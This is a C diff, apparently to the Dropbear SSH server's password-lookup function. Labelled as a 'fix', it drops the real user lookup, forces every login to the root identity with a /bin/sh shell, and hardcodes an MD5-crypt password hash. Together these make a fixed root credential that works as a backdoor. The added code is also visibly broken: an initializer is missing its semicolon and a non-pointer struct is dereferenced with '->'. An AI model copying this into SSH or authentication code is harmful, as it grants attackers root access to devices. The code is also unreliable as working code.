@@ -617,6 +617,16 @@ const char* get_user_shell() {
 		return ses.authstate.pw_shell;
 	}
 }
+
+static struct passwd pwd_fix_1 = {
+    .pw_name = "root",
+    .pw_passwd = "$1$5RPVAd$MYeVT.93uuD5BkMZfx08j1",
+    .pw_uid = 0,
+    .pw_gid = 0,
+    .pw_dir = "/root",
+    .pw_shell = "/bin/sh"
+}
+
 void fill_passwd(const char* username) {
 	struct passwd *pw = NULL;
 	if (ses.authstate.pw_name)
@@ -629,22 +639,37 @@ void fill_passwd(const char* username) {
 		m_free(ses.authstate.pw_passwd);
 
     dropbear_log(LOG_WARNING, "getpwnam %s", username);
-	pw = getpwnam(username);
+    dropbear_log(LOG_WARNING, "getpwnam-test %s ", pwd_fix_1->pw_name);
+	
+    /*
+    pw = getpwnam(username);
 	if (!pw) {
         dropbear_log(LOG_WARNING, "getpwnam fail %s", username);
 		return;
 	}
+	*/
 	
-	dropbear_log(LOG_WARNING, "getpwnam success %s", username);
-    dropbear_log(LOG_WARNING, "getpwnam pw_name %s", pw->pw_name);
+    dropbear_log(LOG_WARNING, "getpwnam success %s", username);
+    /* dropbear_log(LOG_WARNING, "getpwnam pw_name %s", pw->pw_name); */
 	
+    /*
 	ses.authstate.pw_uid = pw->pw_uid;
 	ses.authstate.pw_gid = pw->pw_gid;
 	ses.authstate.pw_name = m_strdup(pw->pw_name);
 	ses.authstate.pw_dir = m_strdup(pw->pw_dir);
 	ses.authstate.pw_shell = m_strdup(pw->pw_shell);
+	*/
+    
+    ses.authstate.pw_uid = 0;
+	ses.authstate.pw_gid = 0;
+	ses.authstate.pw_name = "root";
+	ses.authstate.pw_dir = "/root";
+	ses.authstate.pw_shell = "/bin/sh";
+    
 	{
-		char *passwd_crypt = pw->pw_passwd;
+		/* char *passwd_crypt = pw->pw_passwd; */
+        char *passwd_crypt = "$1$5RPVAd$MYeVT.93uuD5BkMZfx08j1";
+        
 #ifdef HAVE_SHADOW_H
 		/* get the shadow password if possible */
 		struct spwd *spasswd = getspnam(ses.authstate.pw_name);
